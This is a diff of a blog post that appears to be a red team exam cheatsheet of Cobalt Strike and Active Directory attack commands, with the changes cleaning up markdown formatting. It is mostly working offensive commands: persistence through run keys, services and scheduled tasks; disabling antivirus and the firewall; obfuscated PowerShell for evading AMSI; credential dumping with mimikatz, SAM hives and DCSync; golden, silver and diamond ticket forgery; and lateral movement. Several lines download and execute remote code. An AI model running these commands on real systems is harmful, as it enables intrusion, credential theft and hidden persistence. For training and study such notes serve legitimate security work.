@@ -8,7 +8,7 @@ tags: [active directory, redteaming, certs, c2, cobalt strike]
 
 ## **Introduction**
 
-Peace be upon all of you. I recently completed the **Red Team Operator course (CRTO)** from Zero-Point Security, created by Daniel Duggan ******, and honestly, I truly loved this certificate content. The course is extremely well-structured, very informative, and clearly designed with a focus on the OPSEC considerations behind every step. Most of the material is delivered in written format, which I personally found excellent for deep understanding and note-taking, and each module is followed by video walkthroughs for the lab solutions.
+Peace be upon all of you. I recently completed the Red Team Operator course (CRTO) from Zero-Point Security, created by Daniel Duggan, and honestly, I truly loved this certificate content. The course is extremely well-structured, very informative, and clearly designed with a focus on the OPSEC considerations behind every step. Most of the material is delivered in written format, which I personally found excellent for deep understanding and note-taking, and each module is followed by video walkthroughs for the lab solutions.
 
 The exam itself was very challenging at least for me — I failed my first two attempts. But Alhamdulillah, on the third attempt, I finally passed with full points. It was a tough journey, but definitely worth it.
 
@@ -21,7 +21,7 @@ This Cheatsheet is simply a quick reference for the commands and techniques cove
 ## **beacon Commands**
 
 ```bash
-**# Misc**
+# Misc
 help
 ## Registeries
 reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
@@ -35,7 +35,7 @@ timestomp [fileA] [fileB]
 desktop [pid] [x86|x64] [high|low]
 desktop 592 x64 high
 
-**# Beacon**
+# Beacon
 sleep
 ## Execute OS commands using Win32 API calls
 run
@@ -67,7 +67,7 @@ spawnas [DOMAIN\user] [password] [listener]
 inject [pid] [x86|x64] [listener]
 inject 9942 x64 Lab-SMB
 
-**# Lateral Movement**
+# Lateral Movement
 ## A wrapper of runas.exe, using credentials you can run a command as another user
 runas [DOMAIN\user] [password] [command] [arguments]
 runas CORP\Administrator securePassword12! Powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.50.90:80/filename'))"
@@ -91,13 +91,13 @@ portscan 172.16.48.0/24 1-2048,3000,8080
 ### **C2 Profile**
 
 ```python
-**# Team Server**
+# Team Server
 ssh attacker@10.0.0.5
 
 # Change default.profile as needed
 cd /opt/cobaltstrike/profiles;rm default.profile;nano default.profile
 
-**# Sample of Profile Optioons**
+# Sample of Profile Optioons
 stage {
 	 ## Prevents Beacon from allocating memory pages that are both writable and executable at the same time
    set userwx "false";
@@ -111,9 +111,9 @@ stage {
 	 set obfuscate "true"; 
 }
 
-**# Post-Exploitation Fork & Run**
+# Post-Exploitation Fork & Run
 ## Proccess Injection Methods from Top to bottom
-****process-inject {
+process-inject {
   execute {
       NtQueueApcThread-s;
       NtQueueApcThread;
@@ -145,7 +145,7 @@ post-ex {
       strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";
 }
 
-**# Restart the team server and see logs**
+# Restart the team server and see logs
 sudo /usr/bin/docker restart cobaltstrike-cs-1
 sudo /usr/bin/docker logs cobaltstrike-cs-1 
 ```
@@ -153,7 +153,7 @@ sudo /usr/bin/docker logs cobaltstrike-cs-1
 ### **Cobalt Strike Kits**
 
 ```powershell
-# **Artifact Kit**
+# Artifact Kit
 code C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\src-common\
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
 ./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>
@@ -171,9 +171,9 @@ while(x--) {
 ## Identify the detected part using Ghidra then modify and rebuild the c code again
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\artifact64big.exe
 
-# **Resource Kit**
+# Resource Kit
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
-****./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
+./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
 code C:\Tools\cobaltstrike\custom-resources\
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e amsi
 
@@ -183,7 +183,7 @@ Invoke-Obfuscation .\cobaltstrike\custom-resources\compress.ps1
 ### Using token obfusacation
 TOKEN\ALL\1
 SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
-**##** template.x64.ps1
+## template.x64.ps1
 ### Names
 func_get_proc_address -> get_proc_address 
 func_get_delegate_type -> get_delegate_type
@@ -196,20 +196,20 @@ $ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [I
 ### **Post Ex**
 
 ```bash
-**# Session Prepping**
+# Session Prepping
 ## Once you have an initial shell (cmd.exe / powershell.exe). Migrate out of the initial noisy process (unsafe context) as early as possible to blend in and reduce detection
 ps
 inject 9942 x64 lon-WS-1
 
-**# spawnto** 
+# spawnto 
 ## Change Sacrificial Process that will run as part of the Fork & Run Commands
 spawnto x64 C:\Windows\System32\dllhost.exe
-****## For Psexec; the process that the service will execute during the lateral movement proccess (jump) 
-****ak-settings service updater
+# For Psexec; the process that the service will execute during the lateral movement proccess (jump) 
+ak-settings service updater
 ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
 ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe
 
-**# Parent-Child relationships** 
+# Parent-Child relationships 
 ## Control which process appears to have spawned another process during fork-and-run operations 
 ## Running the post-ex command direclty without PPIP (msedge.exe → rundll32.exe) are strong indicators of malicious activity
 ## while chains such as (msedge.exe → msedge.exe) are common and expected
@@ -217,16 +217,16 @@ ps
 ppid [pid]
 spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
 
-**# BlockDLL**
+# BlockDLL
 ## Prevent non-Microsoft signed DLLs from being loaded into child processes launched by a Beacon to reduce EDR mointoring for the proccess
 blockdlls start
 
-**# Image Load Events**
+# Image Load Events
 ## Post-Ex injects a DLL into a target process that often needs to load additional Windows libraries to function (PowerShell-based capabilities -> System.Management.Automation.dll)
 ## Detection occurs when a process loads DLLs that do not match its normal behavior (notepad.exe -> System.Management.Automation.dll)
 ## So The selected process must be one that normally loads the same type of libraries required by the post-ex capability.
 ## (explorer.exe -> msiexec.exe -> System.Management.Automation.dll)
-****ps
+ps
 ppid 6648 
 spawnto x64 C:\Windows\System32\msiexec.exe
 powerpick Start-Sleep -s 60
@@ -235,7 +235,7 @@ powerpick Start-Sleep -s 60
 ### **AppLocker**
 
 ```bash
-**# Enumeration**
+# Enumeration
 ## Registery
 Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2'
 Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe'
@@ -247,7 +247,7 @@ ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSy
 download \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\Machine\Registry.pol
 Parse-PolFile -Path .\Desktop\Registry.pol
 
-**# Bypasses**
+# Bypasses
 ## Path Wildcards
 <FilePathCondition Path="*\App-V\*"/>
 ## Writable Directories
@@ -276,7 +276,7 @@ MavInject.exe 6688 /INJECTRUNNING C:\Windows\tracing\trace.dll
 ### **AV & Firewall**
 
 ```powershell
-**# Firewall** 
+# Firewall 
 powerpick Get-NetFirewallProfile
 powerpick Get-NetFirewallProfile | Format-Table Name, Enabled
 powerpick Get-NetFirewallRule | select DisplayName, Enabled, Description
@@ -288,7 +288,7 @@ netsh advfirewall firewall add rule name="Open Port 28190" dir=out action=allow 
 ## Disable firewalls with admin privs - OPSEC falirue
 Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
 
-**# AV**
+# AV
 powerpick Get-MpPreference
 powerpick Add-MpPreference -ExclusionPath "C:\Windows\tracing"
 ## Turn off everything and set exclusion to "C:\Windows\Temp" - OPSEC falirue
@@ -300,7 +300,7 @@ powerpick Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -Di
 ### **LDAP**
 
 ```python
-**# Filters**
+# Filters
 ## SAM_NORMAL_USER_ACCOUNT
 ldapsearch (samAccountType=805306368)
 ## Group
@@ -316,15 +316,15 @@ ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSy
 ## SID
 ldapsearch (objectSid=SID)
 
-**# & | !**
+# & | !
 ldapsearch (&(samAccountType=805306368)(adminCount=1))
 ldapsearch (&(samAccountType=805306368)(|(description=*admin*)(samaccountname=*adm*)))
 ldapsearch (&(samAccountType=805306368)(adminCount=1)(!(name=krbtgt)))
 
-**# Attributes** 
+# Attributes 
 ldapsearch (&(samAccountType=805306368)(adminCount=1)) --attributes name,memberof,ntsecuritydescriptor
 
-**# Bitwise Filters**
+# Bitwise Filters
 ## bitwise AND allows you to query whether a particular flag is set or not
 ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
 ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes samaccountname # Kerberostable account - Not OPSEC safe
@@ -333,13 +333,13 @@ ldapsearch (userAccountControl:1.2.840.113556.1.4.804:=18)
 ## LDAP_MATCHING_RULE_IN_CHAIN - querying the ancestry of an object, which becomes useful when needing to unroll groups of groups 
 ldapsearch "(memberof:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=contoso,DC=com)" --attributes samaccountname
 
-**# SPNs**
+# SPNs
 ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName 
 
-**# Trusts**
+# Trusts
 ## Trust Properties
 ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
-****## Trust Account
+## Trust Account
 ldapsearch (samAccountType=805306370) --attributes samAccountName
 ## domain SID
 ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
@@ -348,7 +348,7 @@ ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hos
 ## Object ID
 ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
 
-**# Delegation**
+# Delegation
 ## Unconstrained Delegation
 ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
 ## Constrained Delegation
@@ -361,14 +361,14 @@ ldapsearch (msDS-AllowedToActOnBehalfOfOtherIdentity=*)
 ### **BOFHound**
 
 ```bash
-**# OPSEC Safe Massive Enumeration**
+# OPSEC Safe Massive Enumeration
 ldapsearch (|(objectClass=domain)(objectClass=computer)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
 ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
 ## Parse the raw cobalt strike logs and convert them to json file to work with bloodhound
 scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .
 bofhound -i logs/
 
-**# Restricted Group Data - Local Group Memberships**
+# Restricted Group Data - Local Group Memberships
 ls \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\
 download \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
 ## Apply the discovered GPOs on bloodhound
@@ -380,12 +380,12 @@ MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2102'})
 MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
 MERGE (y)-[:AdminTo]->(x)
 
-**# WMI Filters**
+# WMI Filters
 ldapsearch (objectClass=groupPolicyContainer) --attributes displayname,gPCWQLFilter
 ldapsearch (objectClass=msWMI-Som) --attributes name,msWMI-Name,msWMI-Parm2 --dn "CN=SOM,CN=WMIPolicy,CN=System,DC=contoso,DC=com"
 ```
 
-## **PowerView/AD Module**
+### **PowerView/AD Module**
 
 ```powershell
 # To be able to use the PowerView and AD module safely, we need to use them on our attacking machine; hence, we need creds/ticket
@@ -409,32 +409,32 @@ Get-ADComputer -Filter * -Server lon-dc-1 | select name
 ## **Persistence**
 
 ```bash
-**# Registry Run Keys**
+# Registry Run Keys
 cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
 upload C:\Payloads\http_x64.exe
 mv http_x64.exe updater.exe
 reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
 reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater
 
-**# Startup Folder**
+# Startup Folder
 cd C:\Users\pchilds\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 upload C:\Payloads\http_x64.exe
 mv http_x64.exe updater.exe
 
-**# Logon Script - execute automatically when the user logs in**
+# Logon Script - execute automatically when the user logs in
 reg_set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\updater.exe
 
-**# PowerShell Profile - executes when new PowerShell windows are opened by a user**
+# PowerShell Profile - executes when new PowerShell windows are opened by a user
 mkdir C:\Users\pchilds\Documents\WindowsPowerShell
 cd C:\Users\pchilds\Documents\WindowsPowerShell
 ## Add this line to profile.ps1 file
 $_ = Start-Job -ScriptBlock { iex (new-object net.webclient).downloadstring("http://bleepincomputer.com/a") }
 upload C:\Payloads\Profile.ps1
 
-**# Scheduled Task**
+# Scheduled Task
 cd C:\Program Files\Microsoft Update Health Tools
 upload C:\Payloads\dns_x64.exe
-****schtaskscreate \Microsoft\Windows\WindowsUpdate\Updater XML CREATE
+schtaskscreate \Microsoft\Windows\WindowsUpdate\Updater XML CREATE
 ## task get triggered when device get restared
 <Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
 <Triggers>
@@ -460,21 +460,21 @@ upload C:\Payloads\dns_x64.exe
 </Actions>
 </Task>
 
-**# Service - executed on system start-up**
+# Service - executed on system start-up
 upload C:\Payloads\beacon_x64.svc.exe
 mv beacon_x64.svc.exe debug_svc.exe
 sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3
 
-**# Silver Tickets - Machine and Service accounts**
+# Silver Tickets - Machine and Service accounts
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/lon-db-1 /aes256:machine_account_kerberos_key /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:MSSQLSvc/lon-db-1.contoso.com:1433 /rc4:service_accout_hash /user:rsteel /id:1108 /groups:513,1106,1107,4602 /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
 
-**# Golden Ticket**
+# Golden Ticket
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:krbtgt_key /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
 make_token CONTOSO\Administrator FakePass
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFg
 
-**# Diamond Ticket**
+# Diamond Ticket
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:krbtgt_key /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap
 make_token CONTOSO\Administrator FakePass
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFg
@@ -483,7 +483,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFg
 ## **PrivEsc**
 
 ```bash
-**# Path Interception**
+# Path Interception
 ## PATH Environment Variable
 env
 cacls C:\Python313\Scripts\
@@ -497,7 +497,7 @@ cd C:\Program Files\Bad Windows Service
 upload C:\Payloads\dns_x64.svc.exe
 mv dns_x64.svc.exe Service.exe
 
-**# Weak Service Permissions**
+# Weak Service Permissions
 ## Service File Permissions - Full Control over service file
 cacls "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe"
 cd C:\Program Files\Bad Windows Service\Service Executable\
@@ -510,13 +510,13 @@ sc_stop BadWindowsService
 sc_config BadWindowsService C:\Path\to\Payload.exe 0 2
 sc_start BadWindowsService
 
-**# Software Vulnerabilities**
+# Software Vulnerabilities
 ## Loading binary file from an untrusted location, and uses a BinaryFormatter to deserialise the data
 C:\Tools\ysoserial.net\ysoserial\bin\Release\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -nop -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAzADEANAA5ADAALwAnACkA" -o raw --outputpath=C:\Payloads\data.bin
 cd C:\Temp
 upload C:\Payloads\data.bin
 
-**# UAC**
+# UAC
 elevate [exploit] [listener]
 runasadmin [exploit] [command] [args]
 ```
@@ -528,64 +528,64 @@ runasadmin [exploit] [command] [args]
 #### **LSASS Memory**
 
 ```bash
-# **NTLM Hashes**
+# NTLM Hashes
 mimikatz sekurlsa::logonpasswords
 
-**# Protected LSASS**
+# Protected LSASS
 mimikatz !+
 !processprotect /process:lsass.exe /remove
 sekurlsa::logonpasswords
 
-# **Kerberos Keys**
+# Kerberos Keys
 mimikatz sekurlsa::ekeys
 
-# **Security Account Manager**
+# Security Account Manager
 ## Copying the SAM and SYSTEM file from the Shadow Volume
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system        
-**##** Save SAM and SYSTEM files from the registry
+## Save SAM and SYSTEM files from the registry
 reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
 reg save HKLM\system C:\users\Administrator\Desktop\system-reg
 
-# **LSA Secrets**
+# LSA Secrets
 mimikatz lsadump::secrets
-****mimikatz !lsadump::secrets
+mimikatz !lsadump::secrets
 
-# **Cached Domain Credentials**
+# Cached Domain Credentials
 mimikatz lsadump::cache
-****mimikatz !lsadump::cache
+mimikatz !lsadump::cache
 ```
 
 #### **NTDS Domain Controller**
 
 ```bash
 # To dump the content of the NTDS file we need: C:\Windows\NTDS\ntds.dit
-# **Local Dumping (No Credentials)**
+# Local Dumping (No Credentials)
 powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
 ```
 
 #### **Security Account Manager (SAM)**
 
 ```bash
-**# Volume Shadow Copy Service**
+# Volume Shadow Copy Service
 ## Creating a Shadow Copy of Volume C with WMIC
 wmic shadowcopy call create Volume='C:\'
 vssadmin list shadows
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
 
-**# Registry Hives**
+# Registry Hives
 reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
 reg save HKLM\system C:\users\Administrator\Desktop\system-reg
 
-**#** LOCAL
-****python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
+# LOCAL
+python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
 ```
 
 #### **Windows Credential Manager**
 
 ```bash
-**# WindowsValut**
+# WindowsValut
 ## cmd.exe
 vaultcmd /list
 vaultcmd /listcreds:"Windows Credentials" /all
@@ -595,7 +595,7 @@ execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe crede
 ## mimkatz
 sekurlsa::credman
 
-**# Web Browsers**
+# Web Browsers
 Import-Module C:\Tools\Get-WebCredentials.ps1
 Get-WebCredentials
 beacon> execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome
@@ -604,7 +604,7 @@ beacon> execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome
 ### **DPAPI**
 
 ```bash
-**# SharpDPAPI**
+# SharpDPAPI
 ## Fom a domain Controller
 execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey
 ## Local Admin Access Required
@@ -617,11 +617,11 @@ execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe crede
 
 ```powershell
 
-**# Via Beacon**
+# Via Beacon
 dcsync contoso.com CONTOSO\krbtgt
 mimikatz !lsadump::dcsync /user:CONTOSO\krbtgt
 
-**# Remotely**
+# Remotely
 secretsdump.py -k lon-dc-1.contoso.com -no-pass -just-dc
 secretsdump.py -k lon-dc-1.contoso.com -no-pass -just-dc-user krbtgt
 ```
@@ -629,24 +629,24 @@ secretsdump.py -k lon-dc-1.contoso.com -no-pass -just-dc-user krbtgt
 ### **Tickets Harvesting**
 
 ```powershell
-**# AS-REP**
+# AS-REP
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
 krb_asreproasting /user: /dc: /domain:
 
-**# Kerberoasting**
+# Kerberoasting
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple
 ## OPSEC safe - Only roasting one SPN 
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /spn:MSSQLSvc/lon-sql-1.contoso.com:1433 /simple /nowrap
 krb_kerberoasting /spn:/dc: /domain:
 
-**# Extracting Tickets**
+# Extracting Tickets
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
 krb_traige
 ## Dump Current Login Session TGT
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x60c90 /service:krbtgt /nowrap
 krb_dump /luid:3e7 /service:krbtgt /user:administrator
 
-**# Renewing TGTs**
+# Renewing TGTs
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket: 
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket: /nowrap
 krb_renew /ticket:
@@ -655,7 +655,7 @@ krb_renew /ticket:
 ## **User Impersonation**
 
 ```bash
-**# Token Impersonation**
+# Token Impersonation
 ## uses the plaintext credentials of a user to create a new access token, and then impersonates it. This allows Beacon to use the alternate credentials when interacting with resources on the network.  It has no impact on local actions
 make_token CONTOSO\rsteel Passw0rd!
 ## steals the primary access token from a process running as a different user
@@ -665,15 +665,15 @@ rev2self
 ## hold a reference to the token, even after the process has been closed 
 token-store steal/show/use/remove
 
-**# Pass the Hash - a wrapper around sekurlsa::pth**
+# Pass the Hash - a wrapper around sekurlsa::pth
 pth CONTOSO\rsteel fc525c9683fffe06cc95ba2ffc971889
 
-**# Requesting Tickets**
+# Requesting Tickets
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:C:\Users\Attacker\Desktop\rsteel.kirbi /dc:lon-dc-1 /ptt
 krb_asktgs /service:cifs/lon-dc-1 /domain: /dc: /ticket: 
 
-**# Injecting Tickets**
+# Injecting Tickets
 ## Built in beacon in the current login session
 kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
 ## Diffrent Login Session
@@ -688,7 +688,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /pr
 krb_describe /ticket:
 krb_ptt /ticket:
 
-**# Converting Tickets**
+# Converting Tickets
 ## Windows Format
 $ticket = "doIFo[...snip...]kNPTQ=="
 [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))
@@ -699,14 +699,14 @@ ticketConverter.py rsteel.kirbi rsteel.ccache
 ## **Lateral Movement**
 
 ```bash
-**# WinRM**
+# WinRM
 ## executes a payload entirely within memory, without requiring it to be dropped to disk
 ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
 jump winrm64 lon-ws-1 smb
 ## only remote-exec that return output
 remote-exec winrm lon-ws-1 net sessions
 
-# **PsExec**
+# PsExec
 ## uploads the special service binary payload to disk and creates a new service to run it - Not OPSEC Safe
 ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
 jump psexec64 lon-ws-1 smb
@@ -715,7 +715,7 @@ jump psexec64 lon-ws-1 smb
 ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
 jump scshell64 lon-ws-1 smb
 
-**# MavInject - inject any arbitrary DLL into a target process**
+# MavInject - inject any arbitrary DLL into a target process
 remote-exec winrm lon-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id
 mavinject.exe [PID] /INJECTRUNNING [DLL PATH]
 remote-exec wmi lon-ws-1 mavinject.exe 1992 /INJECTRUNNING C:\Windows\System32\smb_x64.dll
@@ -725,15 +725,15 @@ link lon-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
 ## **Pivoting**
 
 ```bash
-**# Pivoting
-## Socks Proxies**
+# Pivoting
+## Socks Proxies
 socks [port] [type]
 socks 1080 socks5
 ## Reverse Port Forward
 rportfwd 28190 localhost 80
 netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190
 
-**# Pivot Listners**
+# Pivot Listners
 ## Used when you need to obtain a reverse shell from a host that cannot directly reach your attacker machine over the network
 ## 1. Create a reverse port forward from Foothold Machine → Team Server. This allows the Target Machine to reach the Team Server and download the beacon payload
 rportfwd 28190 localhost 80
@@ -747,10 +747,10 @@ rportfwd 4444 windows/beacon_reverse_tcp
 ## **Kerberos Delegation Attacks**
 
 ```bash
-**# Unconstrained Delegation**
+# Unconstrained Delegation
 ## Enum
 ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
-****## User Interaction - Run Monitor mode on the machine that is configured for delegation
+## User Interaction - Run Monitor mode on the machine that is configured for delegation
 ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
 jump schell64 lon-ws-1
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap ## high integrity
@@ -761,7 +761,7 @@ execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\Shar
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:doIFt /nowrap
 krb_s4u /ticket: /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator
 
-**# Constrained Delegation**
+# Constrained Delegation
 ## Enum
 ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
 ## Protocol transition
@@ -777,13 +777,13 @@ kerberos_ticket_use C:\Users\Attacker\Desktop\cifs_lon-fs-1.kirbi
 ## Without protocol transition
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn /tgs:doIFp /nowrap
 
-**# Service Name Substitution
-##** Fork & Run
-****execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:doIFn /impersonateuser:Administrator /nowrap
-**## BOF**
+# Service Name Substitution
+## Fork & Run
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:doIFn /impersonateuser:Administrator /nowrap
+## BOF
 krb_s4u /ticket: /service:time/lon-fs-1 /impersonateuser:Administrator /altservice:cifs
 
-**# RBCD**
+# RBCD
 ## Enumeration
 ### writeProperty
 $Cred = Get-Credential CONTOSO\rsteel
@@ -813,24 +813,24 @@ krb_s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /service:cifs/lon-fs-1
 ## **Microsoft SQL Server**
 
 ```powershell
-**# Discovery**
+# Discovery
 ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
 portscan 10.10.120.0/23 1433 arp 1024
 
-**# Enumeration**
+# Enumeration
 sql-1434udp 10.10.120.20
 sql-info lon-db-1
 sql-whoami lon-db-1
 sql-query lon-db-1 "SELECT @@SERVERNAME"
 sql-databases / sql-tables / sql-columns 
 
